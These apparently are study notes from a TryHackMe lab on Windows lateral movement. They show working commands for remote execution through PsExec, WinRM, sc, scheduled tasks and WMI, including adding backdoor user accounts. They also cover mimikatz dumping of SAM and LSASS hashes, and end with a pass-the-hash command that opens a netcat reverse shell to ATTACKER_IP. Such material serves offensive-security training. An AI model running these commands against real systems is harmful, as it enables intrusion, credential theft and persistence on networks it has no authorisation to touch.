# Lateral Movement and Pivoting

## Moving Through the Network
### Adminitstrators and UAC
Two types of administrtors:
- Local accounts part of the local Administrators group `{NitBIOS_Name}\administrator ex)example\administrator, {DOMAIN_NAME}\administrator ex)example.com\administrator`
- Domain accounts part of the local Administrators group `.\administrator`  

User Account Control([UAC](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)) restricts local administrators privirege.  

- By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP.   
- Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.  

## Spawning Processes Remotely

### Psexec
- Ports: 445/TCP (SMB)
- Required Group Memberships: Administrators  

Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).  

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Remote Process Creation Using WinRM
- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP(WinRM HTTPS)
- Required Group Memberships: Remote Management Users  

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.  
To connect to a remote Powershell session from the command line, we can use the following command:  
`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`  
We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```  
Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:  
```
Enter-PSSession -Computername TARGET -Credential $credential
```  
Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
```
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Remotely Creating Services Using sc
- Ports:
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- Required Group Memberships: Administrators  
We can create and start a service named "THMservice" using the following commands:  
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```
To stop and delete the service, we can then execute the following commands:
```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

### Creating Scheduled Tasks Remotely
To create a task named THMtask1, we can use the following commands:  
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```
Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.  
Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:
```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

## Moving Laterally Using WMI
WMI(Windows Management Instrumentation) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

### Connecting to WMI From Powershell
Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password. This object will be stored in the $credential variable and utilised throughout the techniques on this task:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
- DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP.
- Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).  

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable.
```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Remote Process Creation Using WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators  

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```
On legacy systems, the same can be done using wmic from the command prompt:
```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

### Creating Services Remotely with WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators  

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
And then, we can get a handle on the service and start it with the following commands:
```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```
Finally, we can stop and delete the service with the following commands:
```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Creating Scheduled Tasks Remotely with WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators  

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```
To delete the scheduled task after it has been used, we can use the following command:
```
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

### Installing MSI packages through WMI
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
We can achieve the same by us using wmic in legacy systems:
```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## Use of Alternate Authentication Material

### NTLM Authentication
![ntlm](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/7a3d4ba8-6638-4241-899f-7996289fded1)

#### Pass-the-Hash
If the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.  
To extract NTLM hashes, we can either use mimikatz to read the ***local SAM*** or extract hashes directly from ***LSASS memory***.  

- Extracting NTLM hashes from local SAM:  
    This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
```
C:\> C:\tools\mimikatz.exe

mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

- Extracting NTLM hashes from LSASS memory:  
    This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
```
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```  

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:  
```
user@AttackBox$ nc -lvp 5555
```
```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```


